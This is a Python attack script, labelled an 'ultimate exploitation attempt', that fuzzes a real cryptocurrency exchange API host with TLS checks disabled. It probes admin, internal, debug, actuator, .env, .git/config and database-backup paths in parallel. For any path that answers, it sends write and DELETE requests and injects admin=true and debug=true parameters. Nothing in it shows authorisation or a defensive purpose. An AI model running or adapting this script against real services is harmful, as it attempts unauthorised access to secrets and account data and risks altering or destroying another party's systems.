#!/usr/bin/env python3
"""
Ultimate exploitation attempt - trying EVERYTHING
"""
import requests
import concurrent.futures
import time

requests.packages.urllib3.disable_warnings()

BASE = "https://api.bybit.com"
FOUND = []

def test_endpoint(endpoint):
    try:
        r = requests.get(f"{BASE}{endpoint}", verify=False, timeout=2)
        if r.status_code not in [404, 403]:
            return (endpoint, r.status_code, r.text[:100])
    except:
        pass
    return None

# Massive endpoint wordlist
endpoints = [
    # Admin/Internal
    "/admin", "/admin/login", "/admin/users", "/admin/dashboard",
    "/internal/users", "/internal/config", "/internal/api/users",
    "/_admin", "/_internal", "/api/_internal",
    
    # Metrics/Monitoring
    "/health", "/healthz", "/status", "/ping", "/metrics",
    "/actuator/health", "/actuator/env", "/actuator/dump",
    "/debug", "/debug/pprof", "/debug/vars",
    
    # API versions
    "/v1/users", "/v2/users", "/v3/users", "/v4/users",
    "/v1/account", "/v2/account", "/v3/account",
    "/api/v1/users", "/api/v2/users",
    
    # Common paths
    "/users", "/accounts", "/orders", "/trades",
    "/api/users", "/api/accounts", "/api/config",
    
    # Files
    "/.env", "/.git/config", "/config.json", "/settings.json",
    "/backup", "/backup.sql", "/dump.sql",
    
    # GraphQL
    "/graphql", "/graphql/console", "/api/graphql",
    "/v1/graphql", "/graph",
    
    # Documentation
    "/docs", "/api-docs", "/swagger", "/swagger.json",
    "/swagger-ui", "/redoc", "/openapi.json",
    
    # Upload
    "/upload", "/api/upload", "/file/upload",
    "/v5/upload", "/api/v5/upload",
]

print("="*80)
print("ULTIMATE EXPLOIT ATTEMPT")
print("="*80)

print(f"\n[1] Fuzzing {len(endpoints)} endpoints in parallel...")

with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
    results = executor.map(test_endpoint, endpoints)
    
for result in results:
    if result:
        endpoint, code, text = result
        print(f"âœ“ {endpoint} - {code}")
        FOUND.append(endpoint)
        if code == 200 and len(text) > 10:
            print(f"  Response: {text}")

print(f"\nFound {len(FOUND)} endpoints")

# If found any, test them deeper
for endpoint in FOUND:
    print(f"\n\n[DEEP TEST] {endpoint}")
    print("-" * 80)
    
    # Try different methods
    for method in ['POST', 'PUT', 'DELETE', 'PATCH']:
        try:
            r = requests.request(method, f"{BASE}{endpoint}", 
                               verify=False, timeout=2)
            if r.status_code not in [404, 403, 405]:
                print(f"  {method}: {r.status_code}")
        except:
            pass
    
    # Try parameter injection
    params = {
        'id': '1',
        'userId': '1',
        'admin': 'true',
        'debug': 'true',
    }
    
    try:
        r = requests.get(f"{BASE}{endpoint}", params=params,
                        verify=False, timeout=2)
        if 'admin' in r.text.lower() or 'debug' in r.text.lower():
            print(f"  ğŸš¨ Sensitive keywords in response!")
    except:
        pass

print("\n" + "="*80)
print("ULTIMATE EXPLOIT COMPLETE")
if len(FOUND) > 0:
    print(f"ğŸ¯ Found {len(FOUND)} interesting endpoints!")
else:
    print("âŒ No exploitable endpoints found")
print("="*80)
